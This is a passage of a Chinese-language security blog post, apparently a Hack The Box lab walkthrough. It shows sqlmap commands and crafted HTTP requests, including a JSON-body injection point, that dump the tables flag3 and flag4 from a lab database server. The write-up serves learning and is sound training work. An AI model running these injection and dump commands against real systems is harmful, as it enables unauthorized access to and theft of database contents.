+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &#x27;http://154.57.164.70:31117/case3.php&#x27;   --compressed   -H &#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0&#x27;   -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;   -H &#x27;Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&#x27;   -H &#x27;Accept-Encoding: gzip, deflate&#x27;   -H &#x27;Connection: keep-alive&#x27;   -H &#x27;Referer: http://154.57.164.70:31117/&#x27;   -H &#x27;Upgrade-Insecure-Requests: 1&#x27;   -H &#x27;Priority: u=0, i&#x27; -H &#x27;cookie: id=*&#x27; -D testdb -T &#x27;flag3&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<p>知道表名的情况下就不爆破表了，直接获得数据</p>
+<h1 id="表-flag4-的内容是什么？"><a href="#表-flag4-的内容是什么？" class="headerlink" title="表 flag4 的内容是什么？"></a>表 flag4 的内容是什么？</h1><p>这次的注入点在json内，比较麻烦，htb也给出了提示，我们直接写个文件标记注入点即可,打开bp复制下包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /case4.php HTTP/1.1</span><br><span class="line">Host: 154.57.164.70:31117</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: http://154.57.164.70:31117/</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里看到请求方式是get，但是我们需要json传送注入点，所以改为post,然后标记下,还需要添加Content-Type: application&#x2F;json因为上传格式是json</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /case4.php HTTP/1.1</span><br><span class="line">Host: 154.57.164.70:31117</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: http://154.57.164.70:31117/</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;: 1*&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r tmp.txt --batch</span><br><span class="line"></span><br><span class="line">sqlmap -r tmp.txt -T flag4 --dump</span><br></pre></td></tr></table></figure>
+
+<h1 id="表-flag5-的内容是什么？"><a href="#表-flag5-的内容是什么？" class="headerlink" title="表 flag5 的内容是什么？"></a>表 flag5 的内容是什么？</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ziddzide.github.io">ziddzide</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ziddzide.github.io/2026/06/17/sqlmap-htb/">https://ziddzide.github.io/2026/06/17/sqlmap-htb/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ziddzide.github.io" target="_blank">ziddzide的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/06/16/SQL-Injection-Fundamentals/" title="SQL Injection Fundamentals"><img class="cover" src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL Injection Fundamentals</div></div><div class="info-2"><div class="info-item-1">使用命令行通过 MySQL 客户端连接到数据库。使用“show databases;”命令列出数据库管理系统 (DBMS) 中的数据库。第一个数据库的名称是什么？1mysql -u root -ppassword -h 154.57.164.66 -P 32277 --ssl=0  由于一些比较先进的mysql客户端会默认尝试SSL&#x2F;TLS，但是在这个环境中的数据库服务器不支持，需要--ssl=0,有的时候需要--skip-ssl,因为不同版本对参数的支持不同 1234567891011MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| employees          || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in se...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/user/user.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ziddzide</div><div class="author-info-description">记录安全研究、漏洞分析、应急响应笔记</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ziddzide"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ziddzide" target="_blank" title="Github"><i style="color: #24292e;"></i></a><a class="social-icon" href="mailto:hello@ziddzide.com" target="_blank" title="Email"><i class="1" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到 ziddzide 的安全博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQlmap%E6%97%A5%E5%BF%97%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">SQlmap日志描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-content-is-stable"><span class="toc-number">1.1.</span> <span class="toc-text">URL content is stable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parameter-appears-to-be-dynamic"><span class="toc-number">1.2.</span> <span class="toc-text">Parameter appears to be dynamic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parameter-might-be-injectable"><span class="toc-number">1.3.</span> <span class="toc-text">Parameter might be injectable\</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parameter-might-be-vulnerable-to-XSS-attacks"><span class="toc-number">1.4.</span> <span class="toc-text">Parameter might be vulnerable to XSS attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Back-end-DBMS-is-%E2%80%98%E2%80%A6%E2%80%99"><span class="toc-number">1.5.</span> <span class="toc-text">Back-end DBMS is ‘…’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-risk-values"><span class="toc-number">1.6.</span> <span class="toc-text">Level&#x2F;risk values</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflective-values-found"><span class="toc-number">1.7.</span> <span class="toc-text">Reflective values found</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parameter-appears-to-be-injectable"><span class="toc-number">1.8.</span> <span class="toc-text">Parameter appears to be injectable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-based-comparison-statistical-model"><span class="toc-number">1.9.</span> <span class="toc-text">Time-based comparison statistical model</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extending-UNION-query-injection-technique-tests"><span class="toc-number">1.10.</span> <span class="toc-text">Extending UNION query injection technique tests</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Technique-appears-to-be-usable"><span class="toc-number">1.11.</span> <span class="toc-text">Technique appears to be usable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parameter-is-vulnerable"><span class="toc-number">1.12.</span> <span class="toc-text">Parameter is vulnerable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sqlmap-identified-injection-points"><span class="toc-number">1.13.</span> <span class="toc-text">Sqlmap identified injection points</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-logged-to-text-files"><span class="toc-number">1.14.</span> <span class="toc-text">Data logged to text files</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">高级用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D-%E5%90%8E%E7%BC%80%E8%B0%83%E6%95%B4"><span class="toc-number">2.1.</span> <span class="toc-text">前&#x2F;后缀调整</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#risk-level"><span class="toc-number">2.2.</span> <span class="toc-text">risk&#x2F;level</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E8%B0%83%E6%A0%A1"><span class="toc-number">2.3.</span> <span class="toc-text">高级调校</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">2.3.1.</span> <span class="toc-text">状态码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%87%E9%A2%98"><span class="toc-number">2.3.2.</span> <span class="toc-text">标题</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/06/17/sqlmap-htb/" title="sqlmap-htb"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlmap-htb"/></a><div class="content"><a class="title" href="/2026/06/17/sqlmap-htb/" title="sqlmap-htb">sqlmap-htb</a><time datetime="2026-06-17T15:50:54.000Z" title="发表于 2026-06-17 23:50:54">2026-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/16/SQL-Injection-Fundamentals/" title="SQL Injection Fundamentals"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL Injection Fundamentals"/></a><div class="content"><a class="title" href="/2026/06/16/SQL-Injection-Fundamentals/" title="SQL Injection Fundamentals">SQL Injection Fundamentals</a><time datetime="2026-06-15T16:36:54.000Z" title="发表于 2026-06-16 00:36:54">2026-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="跨站脚本攻击"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="跨站脚本攻击"/></a><div class="content"><a class="title" href="/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="跨站脚本攻击">跨站脚本攻击</a><time datetime="2026-06-15T08:42:45.000Z" title="发表于 2026-06-15 16:42:45">2026-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/15/Web-Fuzzing-Skills-Assessment/" title="Web Fuzzing-Skills Assessment"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Fuzzing-Skills Assessment"/></a><div class="content"><a class="title" href="/2026/06/15/Web-Fuzzing-Skills-Assessment/" title="Web Fuzzing-Skills Assessment">Web Fuzzing-Skills Assessment</a><time datetime="2026-06-14T16:52:30.000Z" title="发表于 2026-06-15 00:52:30">2026-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/15/Web-API-Fuzzing/" title="Web-API-Fuzzing"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web-API-Fuzzing"/></a><div class="content"><a class="title" href="/2026/06/15/Web-API-Fuzzing/" title="Web-API-Fuzzing">Web-API-Fuzzing</a><time datetime="2026-06-14T16:23:29.000Z" title="发表于 2026-06-15 00:23:29">2026-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/14/Redeemer/" title="Redeemer"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redeemer"/></a><div class="content"><a class="title" href="/2026/06/14/Redeemer/" title="Redeemer">Redeemer</a><time datetime="2026-06-14T11:15:22.000Z" title="发表于 2026-06-14 19:15:22">2026-06-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ziddzide</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
